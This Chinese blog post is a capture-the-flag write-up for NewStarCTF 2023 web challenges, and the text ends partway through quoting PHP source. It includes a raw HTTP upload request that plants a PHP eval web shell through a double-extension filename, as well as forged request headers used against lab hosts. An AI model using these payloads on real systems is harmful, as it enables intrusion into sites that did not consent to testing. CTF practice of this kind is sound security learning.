<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="依旧放松，不对劲，好像并不放松"><title>NewStarCTF 2023 公开赛道</title><link rel=canonical href=https://baozongwi.xyz/p/newstarctf-2023-public-track/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="NewStarCTF 2023 公开赛道"><meta property='og:description' content="依旧放松，不对劲，好像并不放松"><meta property='og:url' content='https://baozongwi.xyz/p/newstarctf-2023-public-track/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='ssti'><meta property='article:tag' content='phar'><meta property='article:tag' content='nodejs'><meta property='article:tag' content='mysql'><meta property='article:published_time' content='2025-08-08T21:00:15+00:00'><meta property='article:modified_time' content='2025-08-08T21:00:15+00:00'><meta name=twitter:title content="NewStarCTF 2023 公开赛道"><meta name=twitter:description content="依旧放松，不对劲，好像并不放松"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#泄漏的秘密>泄漏的秘密</a></li><li><a href=#begin-of-upload>Begin of Upload</a></li><li><a href=#begin-of-http>Begin of HTTP</a></li><li><a href=#errorflask>ErrorFlask</a></li><li><a href=#begin-of-php>Begin of PHP</a></li><li><a href=#rce>R!C!E!</a></li><li><a href=#easylogin>EasyLogin</a></li><li><a href=#游戏高手>游戏高手</a></li><li><a href=#include-00>include 0。0</a></li><li><a href=#ez_sql>ez_sql</a></li><li><a href=#unserialize>Unserialize？</a></li><li><a href=#upload-again>Upload again!</a></li><li><a href=#rce-1>R!!C!!E!!</a></li><li><a href=#medium_sql>medium_sql</a></li><li><a href=#pop-gadget>POP Gadget</a></li><li><a href=#genshin>GenShin</a></li><li><a href=#otenkigirl>OtenkiGirl</a></li><li><a href=#injectme>InjectMe</a></li><li><a href=#逃>逃</a></li><li><a href=#more-fast>More Fast</a></li><li><a href=#midsql>midsql</a></li><li><a href=#flask-disk>flask disk</a></li><li><a href=#pharone>PharOne</a></li><li><a href=#unserialize-again>Unserialize Again</a></li><li><a href=#final>Final</a></li><li><a href=#final-round>Final round</a></li><li><a href=#yes-pickle>Ye&rsquo;s Pickle</a></li><li><a href=#4-复盘>4-复盘</a></li><li><a href=#give-me-your-photo-plz>Give me your photo PLZ</a></li><li><a href=#unsafe-apache>Unsafe Apache</a></li><li><a href=#so-baby-rce-again>So Baby RCE Again</a></li><li><a href=#include->Include 🍐</a></li><li><a href=#rce-2>R!!!C!!!E!!!</a></li><li><a href=#webshell的利用>WebShell的利用</a></li><li><a href=#nextdrive>NextDrive</a></li><li><a href=#pppython>pppython?</a></li><li><a href=#otenkiboy>OtenkiBoy</a></li><li><a href=#聊聊>聊聊</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%A4%8D%E7%8E%B0/>复现</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/newstarctf-2023-public-track/>NewStarCTF 2023 公开赛道</a></h2><h3 class=article-subtitle>依旧放松，不对劲，好像并不放松</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Aug 08, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>27 minute read</time></div></footer></div></header><section class=article-content><h2 id=泄漏的秘密>泄漏的秘密</h2><p>访问<code>www.zip</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>flag</span><span class=p>{</span><span class=n>r0bots_1s_s0_us3ful_4nd_www</span><span class=o>.</span><span class=n>zip_1s_s0_d4ng3rous</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=begin-of-upload>Begin of Upload</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl>    <span class=o>&lt;</span><span class=nx>script</span> <span class=nx>type</span><span class=o>=</span><span class=s2>&#34;text/javascript&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>validateForm</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>fileInput</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>file</span> <span class=o>=</span> <span class=nx>fileInput</span><span class=p>.</span><span class=nx>files</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>allowedExtensions</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;jpg&#34;</span><span class=p>,</span> <span class=s2>&#34;jpeg&#34;</span><span class=p>,</span> <span class=s2>&#34;png&#34;</span><span class=p>,</span> <span class=s2>&#34;gif&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>fileExtension</span> <span class=o>=</span> <span class=nx>file</span><span class=p>.</span><span class=nx>name</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>).</span><span class=nx>pop</span><span class=p>().</span><span class=nx>toLowerCase</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Please select a file to upload.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>allowedExtensions</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=nx>fileExtension</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=o>&lt;</span><span class=err>/script&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里的拓展名是包含即可不会管位置</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>307</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundarysNiLt38cRoeUSc87</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://41c86846-3bf2-4883-863f-ffaf0ddd3de2.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundarysNiLt38cRoeUSc87
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;1.jpg.php&#34;
</span></span><span class=line><span class=cl>Content-Type: image/jpeg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php eval($_POST[1]);
</span></span><span class=line><span class=cl>------WebKitFormBoundarysNiLt38cRoeUSc87
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;submit&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Upload!!!
</span></span><span class=line><span class=cl>------WebKitFormBoundarysNiLt38cRoeUSc87--
</span></span></code></pre></td></tr></table></div></div><h2 id=begin-of-http>Begin of HTTP</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/?ctf=1</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>node5.buuoj.cn:27312</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>NewStarCTF2023</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>newstarctf.com</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>X-Real-IP</span><span class=o>:</span> <span class=l>127.0.0.1</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>power=ctfer</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>secret=n3wst4rCTF2023g00000d
</span></span></code></pre></td></tr></table></div></div><h2 id=errorflask>ErrorFlask</h2><p>测试不是SSTI，报错出了flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?number1=1&amp;number2=3=1
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/newstarctf-2023-public-track/PixPin_2025-08-08_21-15-24.png width=971 height=589 srcset="/p/newstarctf-2023-public-track/PixPin_2025-08-08_21-15-24_hu_e8d8fe901403267.png 480w, /p/newstarctf-2023-public-track/PixPin_2025-08-08_21-15-24_hu_48c934bd6165e108.png 1024w" loading=lazy class=gallery-image data-flex-grow=164 data-flex-basis=395px></p><h2 id=begin-of-php>Begin of PHP</h2><p>经典的弱比较问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key1&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key2&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;=Level 1=&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key1&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key2&#39;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key1&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key2&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$flag1</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope,this is level 1&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$flag1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;=Level 2=&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key3&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key3&#39;</span><span class=p>])</span> <span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key3&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$flag2</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope,this is level 2&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$flag2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;=Level 3=&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key4&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>strcmp</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key4&#39;</span><span class=p>],</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$flag3</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope,this is level 3&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$flag3</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;=Level 4=&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key5&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key5&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key5&#39;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>2023</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$flag4</span> <span class=o>=</span> <span class=k>True</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope,this is level 4&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$flag4</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;=Level 5=&lt;br&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$var</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[a-zA-Z0-9]/&#34;</span><span class=p>,</span><span class=nv>$var</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope,this is level 5&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$flag5</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>);</span>
